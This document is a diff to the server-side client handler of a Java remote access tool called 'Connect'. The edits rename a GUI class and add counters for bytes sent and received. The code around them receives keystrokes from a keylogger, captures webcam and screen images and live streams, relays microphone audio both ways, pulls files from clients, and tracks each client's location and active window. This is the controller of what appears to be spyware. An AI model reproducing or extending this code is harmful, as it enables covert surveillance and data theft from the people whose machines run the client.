@@ -5,7 +5,7 @@ package br.com.introcdc.connect.server.connection;
 
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.server.ConnectServer;
-import br.com.introcdc.connect.server.ConnectServerGUI;
+import br.com.introcdc.connect.server.gui.ServerGUI;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
 import br.com.introcdc.connect.server.components.ServerImageComponents;
@@ -101,6 +101,7 @@ public class ClientHandler implements Runnable {
             this.writer.println(message);
             this.writer.flush();
         }
+        ConnectServer.BYTES_SENT.addAndGet(ServerControlComponents.getObjectSizeInBytes(message));
     }
 
     @Override
@@ -111,6 +112,7 @@ public class ClientHandler implements Runnable {
             this.writer = writer;
             String command;
             while ((command = reader.readLine()) != null) {
+                ConnectServer.BYTES_RECEIVED.addAndGet(ServerControlComponents.getObjectSizeInBytes(command));
                 if (command.startsWith("key:")) {
                     clientKey = command.replace("key:", "");
                     if (ConnectServer.CONNECTED_KEYS.contains(clientKey)) {
@@ -125,7 +127,7 @@ public class ClientHandler implements Runnable {
                     clientName = command.replace("user:", "");
                     ConnectServer.msg("Conexão com cliente " + getClientInfo() + " estabelecida!");
                     auth = true;
-                    ConnectServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                    ServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                     ServerAudioComponents.generateBeep(100, 1500, true);
                 } else if (!auth) {
                     closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
@@ -152,13 +154,13 @@ public class ClientHandler implements Runnable {
                     send("r-ping");
                 } else if (command.equalsIgnoreCase("r-ping")) {
                     ping = System.currentTimeMillis() - pingTest;
-                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                 } else if (command.startsWith("updateinfo ")) {
                     String[] args = command.split(" ", 4);
                     screens = Integer.parseInt(args[1]);
                     webcams = Integer.parseInt(args[2]);
                     activeWindow = args[3];
-                    ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                 } else if (command.startsWith("keylogger ")) {
                     ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
                 } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
@@ -170,12 +172,13 @@ public class ClientHandler implements Runnable {
                             try (Socket clientSocket = serverSocket.accept();
                                  InputStream is = clientSocket.getInputStream()) {
                                 BufferedImage receivedImage = ImageIO.read(is);
+                                ConnectServer.BYTES_RECEIVED.addAndGet(ServerControlComponents.getObjectSizeInBytes(receivedImage));
                                 if (webcam) {
                                     webcamImage = receivedImage;
                                 } else {
                                     screenImage = receivedImage;
                                 }
-                                ConnectServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                                ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                             }
                         } catch (Exception exception) {
                             if (exception.getMessage() != null && exception.getMessage().equalsIgnoreCase("Socket closed")) {
@@ -218,6 +221,7 @@ public class ClientHandler implements Runnable {
 
                                     if (cmd.contains("-live")) {
                                         BufferedImage receivedImage = ImageIO.read(is);
+                                        ConnectServer.BYTES_RECEIVED.addAndGet(ServerControlComponents.getObjectSizeInBytes(receivedImage));
                                         if (first) {
                                             first = false;
                                             label = ServerImageComponents.openLiveImage(receivedImage, getClientInfo() + " (" + (webcam ? "Webcam" : "Screen") + ")",
@@ -258,6 +262,7 @@ public class ClientHandler implements Runnable {
                                     } else {
                                         first = false;
                                         BufferedImage receivedImage = ImageIO.read(is);
+                                        ConnectServer.BYTES_RECEIVED.addAndGet(ServerControlComponents.getObjectSizeInBytes(receivedImage));
                                         ServerImageComponents.openImage(receivedImage, getClientInfo() + " (" +
                                                 (view ? "Visualização de Imagem" : webcam ? "Webcam" : "Screen") + ")");
                                     }
@@ -326,18 +331,19 @@ public class ClientHandler implements Runnable {
 
                                             byte[] buffer = new byte[4096];
                                             int bytesRead;
-                                            if (ConnectServerGUI.AUDIO_USER != null) {
-                                                ConnectServerGUI.AUDIO_USER.setBackground(Color.GREEN);
+                                            if (ServerGUI.AUDIO_USER != null) {
+                                                ServerGUI.AUDIO_USER.setBackground(Color.GREEN);
                                             }
 
                                             try {
                                                 while (ServerAudioComponents.AUDIO_USER && (bytesRead = in.read(buffer)) != -1) {
                                                     speakersInfo.write(buffer, 0, bytesRead);
+                                                    ConnectServer.BYTES_RECEIVED.addAndGet(bytesRead);
                                                 }
                                             } catch (Exception exception) {
                                                 ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
-                                                if (ConnectServerGUI.AUDIO_USER != null) {
-                                                    ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
+                                                if (ServerGUI.AUDIO_USER != null) {
+                                                    ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                 }
                                             } finally {
                                                 speakersInfo.close();
@@ -347,27 +353,28 @@ public class ClientHandler implements Runnable {
                                                 } catch (Exception ignored) {
                                                 }
                                                 ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do cliente para o servidor finalizada");
-                                                if (ConnectServerGUI.AUDIO_USER != null) {
-                                                    ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
+                                                if (ServerGUI.AUDIO_USER != null) {
+                                                    ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                                 }
                                             }
                                         } else {
                                             OutputStream out = clientSocket.getOutputStream();
                                             byte[] buffer = new byte[4096];
 
-                                            if (ConnectServerGUI.AUDIO_SERVER != null) {
-                                                ConnectServerGUI.AUDIO_SERVER.setBackground(Color.GREEN);
+                                            if (ServerGUI.AUDIO_SERVER != null) {
+                                                ServerGUI.AUDIO_SERVER.setBackground(Color.GREEN);
                                             }
                                             try {
                                                 while (ServerAudioComponents.AUDIO_SERVER) {
                                                     int bytesRead = microphoneInfo.read(buffer, 0, buffer.length);
                                                     if (bytesRead == -1) break;
                                                     out.write(buffer, 0, bytesRead);
+                                                    ConnectServer.BYTES_SENT.addAndGet(bytesRead);
                                                 }
                                             } catch (Exception exception) {
                                                 ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na reprodução do servidor de áudio por parte do servidor do cliente para o servidor (" + exception.getMessage() + ")");
-                                                if (ConnectServerGUI.AUDIO_SERVER != null) {
-                                                    ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
+                                                if (ServerGUI.AUDIO_SERVER != null) {
+                                                    ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                 }
                                             } finally {
                                                 microphoneInfo.close();
@@ -377,8 +384,8 @@ public class ClientHandler implements Runnable {
                                                     serverSocket.close();
                                                 } catch (Exception ignored) {
                                                 }
-                                                if (ConnectServerGUI.AUDIO_SERVER != null) {
-                                                    ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
+                                                if (ServerGUI.AUDIO_SERVER != null) {
+                                                    ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                 }
                                             }
                                         }
@@ -395,8 +402,8 @@ public class ClientHandler implements Runnable {
                                                 speakersInfo.close();
                                             } catch (Exception ignored) {
                                             }
-                                            if (ConnectServerGUI.AUDIO_USER != null) {
-                                                ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
+                                            if (ServerGUI.AUDIO_USER != null) {
+                                                ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                             }
                                         } else {
                                             try {
@@ -409,8 +416,8 @@ public class ClientHandler implements Runnable {
                                                 microphoneInfo.close();
                                             } catch (Exception ignored) {
                                             }
-                                            if (ConnectServerGUI.AUDIO_SERVER != null) {
-                                                ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
+                                            if (ServerGUI.AUDIO_SERVER != null) {
+                                                ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                             }
                                         }
                                     }
@@ -430,8 +437,8 @@ public class ClientHandler implements Runnable {
                                             speakersInfo.close();
                                         } catch (Exception ignored) {
                                         }
-                                        if (ConnectServerGUI.AUDIO_USER != null) {
-                                            ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
+                                        if (ServerGUI.AUDIO_USER != null) {
+                                            ServerGUI.AUDIO_USER.setBackground(Color.RED);
                                         }
                                     } else {
                                         try {
@@ -444,8 +451,8 @@ public class ClientHandler implements Runnable {
                                             microphoneInfo.close();
                                         } catch (Exception ignored) {
                                         }
-                                        if (ConnectServerGUI.AUDIO_SERVER != null) {
-                                            ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
+                                        if (ServerGUI.AUDIO_SERVER != null) {
+                                            ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                         }
                                     }
                                 }
@@ -492,16 +499,16 @@ public class ClientHandler implements Runnable {
                         ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do usuário finalizada! (" + command.replace("stopliveaudiouser", "") + ")");
                     }
                     ServerAudioComponents.AUDIO_USER = false;
-                    if (ConnectServerGUI.AUDIO_USER != null) {
-                        ConnectServerGUI.AUDIO_USER.setBackground(Color.RED);
+                    if (ServerGUI.AUDIO_USER != null) {
+                        ServerGUI.AUDIO_USER.setBackground(Color.RED);
                     }
                 } else if (command.startsWith("stopliveaudioserver")) {
                     if (ServerAudioComponents.AUDIO_SERVER) {
                         ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor finalizada! (" + command.replace("stopliveaudioserver", "") + ")");
                     }
                     ServerAudioComponents.AUDIO_SERVER = false;
-                    if (ConnectServerGUI.AUDIO_SERVER != null) {
-                        ConnectServerGUI.AUDIO_SERVER.setBackground(Color.RED);
+                    if (ServerGUI.AUDIO_SERVER != null) {
+                        ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                     }
                 } else if (command.equalsIgnoreCase("receive-file")) {
                     ConnectServer.msg(getClientInfo() + ": Recebendo arquivo do cliente...");
@@ -516,6 +523,7 @@ public class ClientHandler implements Runnable {
                                 int bytesRead;
                                 while ((bytesRead = dis.read(buffer)) != -1) {
                                     bos.write(buffer, 0, bytesRead);
+                                    ConnectServer.BYTES_RECEIVED.addAndGet(bytesRead);
                                 }
 
                                 ConnectServer.msg(getClientInfo() + ": Arquivo recebido!");
@@ -558,10 +566,10 @@ public class ClientHandler implements Runnable {
             ConnectServer.CONNECTED_KEYS.remove(getClientKey());
         }
         ConnectServer.CLIENTS.remove(getClientId());
-        ConnectServerGUI.removeClientFromTable(getClientKey());
+        ServerGUI.removeClientFromTable(getClientKey());
 
         // Remove o ID da combo na GUI
-        ConnectServerGUI.removeClient(String.valueOf(getClientId()));
+        ServerGUI.removeClient(String.valueOf(getClientId()));
 
         webcamLive = false;
         screenLive = false;
@@ -674,7 +682,7 @@ public class ClientHandler implements Runnable {
 
     public void createChatFrame() {
         // Define ou não o modo escuro antes de setar o LookAndFeel
-        if (ConnectServerGUI.DARK_MODE) {
+        if (ServerGUI.DARK_MODE) {
             try {
                 UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
 
@@ -797,7 +805,7 @@ public class ClientHandler implements Runnable {
         updateTextArea();
 
         // Caso o DARK_MODE esteja habilitado, forçamos a atualização do look
-        if (ConnectServerGUI.DARK_MODE) {
+        if (ServerGUI.DARK_MODE) {
             SwingUtilities.updateComponentTreeUI(CHAT_FRAME);
         }
 
